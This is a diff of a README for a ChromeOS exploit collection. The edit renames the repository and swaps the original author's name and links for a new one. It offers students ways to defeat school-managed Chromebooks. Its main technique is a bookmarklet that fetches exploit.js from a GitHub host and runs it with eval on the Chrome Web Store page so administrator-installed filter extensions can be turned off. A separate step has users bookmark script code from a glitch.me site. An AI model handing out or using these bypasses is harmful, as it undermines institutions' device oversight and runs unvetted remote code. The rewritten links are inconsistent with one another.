@@ -1,13 +1,13 @@
-# EXT-REMOVER
+# Exploits and Hacks
 This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
 Many of these exploits can destroy your computer if used improperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
-If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions">here</a>
+If you need help ask it <a href="https://github.com/neealdon4/Exploits-and-Hacks/discussions">here</a>
 
-Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!
+Please use these only when you have permission, I (Nee) do not condone the use of any exploits for illegal purposes!
   
 **ATTENTION ALL SYS ADMINS!!!**
 
-Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, Chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is an endless game of whack-a-mole. Treat your students to a Windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
+Hello, I am Nee and I created this repo in order to give exploits for the masses and to prove one thing, Chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is an endless game of whack-a-mole. Treat your students to a Windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
 
 <img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
 Image Credit: LittleMissNyan
@@ -73,7 +73,7 @@ I have bad news for you... not all filters are Chrome Extensions. And again, mak
 
 [Baby method for slow people](https://ltmeat.bypassi.com/alt/1.txt)
 
-*Need more help? [Ask in the discussions](https://github.com/3kh0/ext-remover/discussions)*
+*Need more help? [Ask in the discussions](https://github.com/Nee/ext-remover/discussions)*
 
 </details>
 
@@ -158,7 +158,7 @@ This exploit allows you to execute scripts on extensions pages, this is a great 
 
 <i>Getting started</i>
 (Note: if bookmarklets are blocked you're screwed.)
-1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js)) on your school chromebook.
+1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/Nee/ext-remover/main/newpointblank.js)) on your school chromebook.
 2. Make a bookmark with the code there.
 3. Once that is done,
 
@@ -249,7 +249,7 @@ There are several versions of this exploit you can use, here are the 2 most comm
     ```  
     - Compact Cow's UI (Dark)
     ```js
-    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
+    javascript:void fetch(`https://raw.githubusercontent.com/Nee/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
     ```
     2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
     3. Flip the switches on the extensions you want to disable. Simple!  
